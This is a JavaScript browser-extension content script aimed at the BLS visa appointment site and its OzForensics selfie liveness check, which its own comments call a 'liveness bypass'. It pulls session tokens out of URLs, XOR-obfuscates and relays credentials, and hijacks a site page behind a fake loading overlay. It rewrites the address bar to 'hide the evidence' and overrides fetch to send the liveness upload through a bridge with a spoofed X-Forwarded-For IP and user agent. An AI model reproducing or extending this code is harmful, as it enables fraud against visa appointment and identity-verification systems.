(function () {

  // XOR encryption/decryption function used to pass data in the URL
  const xorCrypt = (text, key) => {
    return Array.from(text).map((char, index) =>
      String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(index % key.length))
    ).join('');
  };

  // Helper to safely decode a Base64 string
  const decodeBase64String = (str) => {
    try {
      return atob(str);
    } catch (e) {
      console.error("Failed to decode Base64 string:", str, e);
      return '';
    }
  };

  // Sleep function to introduce delays
  function sleep(seconds) {
    return new Promise(resolve => setTimeout(resolve, seconds * 1000));
  }

  function createLoadingOverlay() {
    const overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.backgroundColor = "#0f2027";
    overlay.style.backdropFilter = "blur(4px)";
    overlay.style.webkitBackdropFilter = "blur(4px)";
    overlay.style.display = "flex";
    overlay.style.justifyContent = "center";
    overlay.style.alignItems = "center";
    overlay.style.flexDirection = "column";
    overlay.style.zIndex = "9999";
    overlay.style.fontFamily = "'Orbitron', sans-serif";
    overlay.style.color = "#0ff";
    overlay.style.textAlign = "center";
    overlay.innerHTML = `
            <div style="width: 80px; height: 80px; border-radius: 50%; border: 5px solid transparent; border-top: 5px solid #0ff; animation: spin 1.5s linear infinite, pulse 1.5s ease-in-out infinite; box-shadow: 0 0 20px #0ff; margin-bottom: 30px;"></div>
            <div class="text" style="font-size: 2.5rem; text-shadow: 0 0 10px #0ff;">BLS SELFIE</div>`;
    
    const style = document.createElement("style");
    style.textContent = `@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } @keyframes pulse { 0%, 100% { box-shadow: 0 0 20px #0ff; } 50% { box-shadow: 0 0 40px #0ff; } }`;
    document.head.appendChild(style);
    return overlay;
  }

  // --- WORKFLOW 1: Activated on the BLS Selfie Page ---
  // Purpose: Scrape tokens, get transaction details from the server, and redirect to the next stage.
  if (location.href.startsWith("https://dz.blsappointment.com/Selfie2.0/BLS_Selfie.php")) {
    
    const processCredentials = async ({ serviceToken, tokenKey }) => {
      const url = "https://dz.blsappointment.com/Selfie2.0/check.php";
      try {
        const bodyData = { sst: serviceToken };
        const response = await fetch(url, {
          method: "POST",
          headers: {
            "Authorization": "Bearer " + tokenKey,
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify(bodyData)
        });

        if (!response.ok) {
          console.error("Failed to get transaction details from check.php");
          window.location.reload();
          return;
        }

const data = await response.json();
const bls_host = data.bls_host;
const proxyHost = data.ip_address; 
const oz_plugin = data.oz_plugin;
const transactionId = data.transaction_id; 
const userId = data.user_id;
const proxyline = data.proxyline;
const user_agents = data.user_agent;

        if (!proxyHost || !userId || !transactionId) {
          console.error("Missing required data from check.php response:", data);
          alert("Session Expired");
          return;
        }

        // Prepare credentials to be passed to the next stage
        const credentialsData = {
          bls_host: bls_host,
          oz_plugin: oz_plugin,
          key: tokenKey,
          code: serviceToken,
          host: proxyHost,
          user_id: userId,
          transaction_id: transactionId,
          proxyline: proxyline,
          user_agents: user_agents
        };

        const jsonString = JSON.stringify(credentialsData);
        const encodedPayload = encodeURIComponent(btoa(xorCrypt(jsonString, "s3cr3tk3y")));

       const message = {
         payload: credentialsData,    // Some data object containing credentials
         action: "saveCredentials",   // Custom action identifier
         type: "FROM_CONTENT"         // Tag to identify message origin
       };

       chrome.runtime.sendMessage(message, function(response) {
         console.log("Response from background:", response);  // Handle response
       });

        // Wait for the message to be processed, then redirect
        await sleep(3);
      const baseUrl = new URL(bls_host).origin;
      //location.href = `${baseUrl}/js/site.js?x=${encodeURIComponent(encodedPayload)}`;
      location.href = `${baseUrl}/assets/images/logo.png?x=${encodeURIComponent(encodedPayload)}`;
      } catch (error) {
        console.error("Error during credential processing:", error);
      }
    };
    
    const extractCredentials = () => {
      const urlParams = new URLSearchParams(location.search);
      const encodedData = urlParams.get("code");
      if (!encodedData) return;

      const decodedData = decodeBase64String(encodedData);
      const [serviceToken, tokenKey] = decodedData.split(",");

      if (serviceToken && tokenKey) {
        processCredentials({ serviceToken, tokenKey });
      } else {
        setTimeout(extractCredentials, 300); // Retry if not found immediately
      }
    };
    
    // Run the extraction logic once the DOM is ready
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", extractCredentials);
    } else {
      extractCredentials();
    }
    return;
  }

  // --- WORKFLOW 2: Activated on the Visa Site after Redirection ---
  // Purpose: Hijack the page, run the liveness check, and report the results back to the server.
  if (location.href.includes("/assets/images/logo.png")) {

    const runLivenessBypass = async () => {
      const encodedData = new URLSearchParams(location.search).get('x');
      if (!encodedData) return;

      try {
        // Decode the credentials passed in the URL
        const decodedData = decodeURIComponent(encodedData);
        const decryptedData = xorCrypt(atob(decodedData), "s3cr3tk3y");
        const {
          bls_host: bls_host,
          oz_plugin: oz_plugin,
          key: tokenKey,
          code: serviceToken,
          host: proxyHost,
          user_id: userId,
          transaction_id: transactionId,
          proxyline = proxyline,
          user_agents = user_agents
        } = JSON.parse(decryptedData);

      const baseUrl = new URL(bls_host).origin;
      chrome.storage.local.set({
         retryurl: `${baseUrl}/assets/images/logo.png?x=${encodedData}`
      }
    );

        // Hide the evidence by changing the URL in the address bar
      history.replaceState(null, '', bls_host + "appointment/livenessrequest");
        
        // Show the fake loading screen
        const loadingOverlay = createLoadingOverlay();
        document.body.appendChild(loadingOverlay);
          loadingOverlay.querySelector(".text").textContent = "Loading Liveness.";

        setupOzLivenessIframe(userId, transactionId,proxyHost,oz_plugin,tokenKey);

        function setupOzLivenessIframe(userId, transactionId,spoofIP,oz_plugin,tokenKey) {
                      loadingOverlay.querySelector(".text").textContent = "Loading Liveness..";

                    // Create iframe for OzLiveness
        const ozLivenessIframe = document.createElement("iframe");
        ozLivenessIframe.id = "OzLivenessIframe";
        ozLivenessIframe.style.position = "fixed";
        ozLivenessIframe.style.top = "0";
        ozLivenessIframe.style.left = "0";
        ozLivenessIframe.style.width = "100%";
        ozLivenessIframe.style.height = "100%";
        ozLivenessIframe.style.zIndex = "10000";
        ozLivenessIframe.style.border = "none";
        ozLivenessIframe.style.backgroundColor = "black";
        ozLivenessIframe.style.display = "none";
        document.body.insertBefore(ozLivenessIframe, document.body.firstChild);
        
            ozLivenessIframe.style.display = "block";
            console.log("Preparing iframe with: UserID=" + userId + ", TransactionID=" + transactionId + ", SpoofIP=" + spoofIP);
            
            // Injected FIRST in the OZ iframe (before the OZ SDK). Overrides
            // fetch + XHR for OZ-host requests and re-issues them through the
            // Android bridge (Kotlin/OkHttp), which adds X-Forwarded-For=ip_address
            // + spoofed UA + client hints — exactly like the extension's
            // background.js onBeforeSendHeaders, and crucially it works for the
            // POST video-selfie upload. Emitted via fn.toString() so no template
            // escaping is needed.
            function ozXffBridge() {
                var BRIDGE = (typeof AndroidBridge !== 'undefined') ? AndroidBridge
                           : (window.top && window.top.AndroidBridge) || null;
                if (!BRIDGE || !BRIDGE.ozRelay) { try { console.log('OZ XFF bridge: no AndroidBridge'); } catch (e) {} return; }
                function isOz(u) { try { return String(u).indexOf('ozforensics') !== -1; } catch (e) { return false; } }
                function b64(buf) { var b = new Uint8Array(buf), s = '', i; for (i = 0; i < b.length; i++) s += String.fromCharCode(b[i]); return btoa(s); }
                function unb64(s) { var bin = atob(s || ''), a = new Uint8Array(bin.length), i; for (i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i); return a; }
                // Only re-serve OZ API/data/upload calls (.php endpoints, or any
                // non-GET). Static assets (.js/.wasm/models) MUST load natively —
                // re-serving the 2.3MB SDK module / face worker via base64 breaks
                // their instantiation and the camera never opens. Those don't need
                // XFF anyway (CDN statics aren't IP-gated).
                // Intercept ONLY the verdict-relevant upload/result POST. Everything
                // else — config.php, tm.php (telemetry), all asset/model GETs, and all
                // XHR — stays 100% native so the SDK inits and the camera opens. Only
                // the media upload POST needs XFF=ip_address for OZ's IP check.
                function needsXff(method, u) {
                    if (!isOz(u)) { return false; }
                    var m = (method || 'GET').toUpperCase();
                    if (m === 'GET' || m === 'HEAD') { return false; }
                    if (String(u).indexOf('tm.php') !== -1) { return false; }
                    return true;
                }

                var origFetch = window.fetch ? window.fetch.bind(window) : null;
                window.fetch = async function (input, init) {
                    try {
                        var url = (typeof input === 'string') ? input : (input && input.url) || '';
                        var method = (((typeof input !== 'string') && input && input.method) || (init && init.method) || 'GET').toUpperCase();
                        if (!needsXff(method, url)) { return origFetch ? origFetch(input, init) : Promise.reject('no fetch'); }
                        var req = (typeof input === 'string') ? new Request(url, init || {}) : input;
                        var headers = {};
                        try { req.headers.forEach(function (v, k) { headers[k] = v; }); } catch (e) {}
                        var bodyB64 = '';
                        if (method !== 'GET' && method !== 'HEAD') {
                            var buf = await req.clone().arrayBuffer();
                            bodyB64 = b64(buf);
                            var ct = req.headers.get('content-type'); if (ct) headers['content-type'] = ct;
                        }
                        var r = JSON.parse(BRIDGE.ozRelay(method, url, JSON.stringify(headers), bodyB64));
                        if (!r || r.status === 0) { throw new Error((r && r.error) || 'ozRelay failed'); }
                        var h = new Headers();
                        if (r.headers) { Object.keys(r.headers).forEach(function (k) { try { h.set(k, r.headers[k]); } catch (e) {} }); }
                        return new Response(unb64(r.bodyB64), { status: r.status, headers: h });
                    } catch (e) { return origFetch ? origFetch(input, init) : Promise.reject(e); }
                };

                // XMLHttpRequest is left UNTOUCHED on purpose. A wholesale XHR
                // replacement broke the OZ SDK's init (it uses XHR features a shim
                // can't fully mirror) and the camera never opened. The SDK issues its
                // API calls (config.php, tm.php, and the upload) via fetch, which the
                // override above already covers — so XHR needs no interception.
                try { console.log('OZ XFF bridge installed (fetch-only, upload-only)'); } catch (e) {}
            }

            const iframeDocument = ozLivenessIframe.contentDocument || ozLivenessIframe.contentWindow.document;
            iframeDocument.open();
            iframeDocument.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>OzLiveness Verification</title>
                    <!-- XFF is now added at the network layer by the LocalProxy MITM
                         (covers the OZ SDK's hidden upload iframe too), so no JS
                         fetch/XHR override is injected here. -->
                    <script src="${oz_plugin}"></script>
                    <style>
                    body {
                        margin: 0; background: #111;
                        font-family: 'Segoe UI', sans-serif;
                        color: white; text-align: center;
                        display: flex; flex-direction: column;
                        justify-content: center; align-items: center;
                        height: 100vh;
                    }
                    h1 {
                        font-size: 2.2em;
                        color: #28a745;
                        margin-bottom: 10px;
                    }
                    .retry-btn {
                        margin-top: 20px;
                        padding: 12px 24px;
                        font-size: 1.1em;
                        background-color: #007bff;
                        border: none;
                        border-radius: 10px;
                        color: white;
                        cursor: pointer;
                    }
                    .retry-btn:hover {
                        background-color: #0056b3;
                    }
                </style>
                </head>
                <body>
                <h1>Loading BLS Selfie 📸</h1>
                <div>Please Wait... ⌛</div>
                <script>
                        function startLiveness() {
                            console.log('OzLiveness starting inside iframe. Data: User ID: ${userId}, Transaction ID: ${transactionId}, Spoof IP: ${spoofIP}');
                            OzLiveness.open({
                                lang: 'en',
                                meta: {
                                    // NOTE: OzLiveness uses its 'transaction_id' meta field. We use the one fetched earlier.
                                    'user_id': '${userId}',
                                    'transaction_id': '${transactionId}' // Use the initially fetched transactionId here too
                                },
                                overlay_options: true,
                                action: ['video_selfie_blank'],
                                on_complete: function(result) {
                                    console.log('OzLiveness completed:', result);
                                    if (result && result.event_session_id) {
                  const sessionId = result.event_session_id;
                  fetch("https://dz.blsappointment.com/Selfie2.0/check.php", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                      "Authorization": "Bearer ${tokenKey}"
                    },
                    body: JSON.stringify({
                      tid: '${transactionId}',
                      slv: sessionId
                    })
                  }).then(r => r.json()).then(data => {
                    if (data.message === "Liveness verified") {
                      document.body.innerHTML = '<div style="color: #0f0">Liveness Completed ✅</div>';
                    } else {
                      document.body.innerHTML = '<div style="color: #f90">Liveness failed Try Again ❗</div>';
                    }
                  });
                }
              },
                                on_error: function(error) {
                                     console.error('OzLiveness Error:', error);
                                     alert('An error occurred during verification: ' + (error.message || 'Unknown error'));
                                     document.body.innerHTML = '<p style="color: red; font-size: 1.5em; text-align: center;">Verification Error. Please retry.</p>';
                                }
                            });
                        }
                       setTimeout(startLiveness, 200); // Use timeout for reliability
                    </script>
                </body>
                </html>
            `);
            iframeDocument.close();
        }
        
      } catch (error) {
        console.error("Fatal error in liveness bypass workflow:", error);
      }
    };
    
    // Run the bypass logic once the DOM is ready
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', runLivenessBypass);
    } else {
      runLivenessBypass();
    }
  }

})();
